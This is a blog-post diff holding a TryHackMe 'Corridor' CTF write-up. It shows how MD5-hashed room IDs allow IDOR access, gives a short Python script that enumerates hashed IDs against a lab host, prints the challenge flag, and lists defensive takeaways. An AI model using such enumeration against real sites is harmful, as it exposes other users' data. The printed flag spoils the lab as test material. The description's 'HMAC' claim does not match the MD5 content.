@@ -1,0 +1,72 @@
+---
+title: "THM Writeup: Corridor"
+description: "Solving TryHackMe's Corridor room — exploiting IDOR via HMAC hash manipulation to access unauthorized rooms."
+date: 2024-11-02
+tags: ["web", "pentest", "ctf"]
+---
+
+import Callout from '../../components/Callout.astro';
+import Flag from '../../components/Flag.astro';
+
+## Overview
+
+Corridor is a beginner-friendly TryHackMe room focused on **Insecure Direct Object Reference (IDOR)** vulnerabilities. The premise: a corridor of doors, each identified by what looks like a random hash.
+
+<Callout type="info">
+**Difficulty:** Easy | **Category:** Web | **Platform:** TryHackMe
+</Callout>
+
+## Recon
+
+Opening the page, we're greeted with a corridor of doors. Clicking on one redirects to a URL like:
+
+```
+http://10.10.x.x/c3b81eab73b4541890c012f3e06e21b6
+```
+
+That hash looks like MD5. Let's check what it decodes to.
+
+```bash
+echo -n "1" | md5sum
+# c4ca4238a0b923820dcc509a6f75849b
+
+echo -n "0" | md5sum
+# cfcd208495d565ef66e7dff9f98764da
+```
+
+The hashes in the URL correspond to MD5 sums of room numbers. The app is using `md5(room_id)` as the identifier with no server-side authorization check.
+
+## Exploitation
+
+If room `1` → `c4ca4238...`, what's room `0`?
+
+```python
+import hashlib
+import requests
+
+target = "http://10.10.x.x"
+
+for i in range(0, 20):
+    h = hashlib.md5(str(i).encode()).hexdigest()
+    r = requests.get(f"{target}/{h}")
+    if "flag" in r.text.lower():
+        print(f"[+] Found flag in room {i}: {h}")
+        print(r.text)
+        break
+```
+
+Room `0` — which shouldn't exist — contains the flag.
+
+<Callout type="tip" title="Why This Works">
+The server only checks whether the hash maps to *any* valid computation, not whether the requesting user is **authorized** to access that resource. Classic IDOR.
+</Callout>
+
+## Flag
+
+<Flag value="THM{IDontNeedAMap}" />
+
+## Takeaways
+
+- Never use predictable identifiers (sequential IDs, simple hashes) as authorization mechanisms
+- Always enforce server-side access control — client-supplied identifiers must be validated against session context
+- MD5 is not a security measure; it's trivially reversible for known input spaces
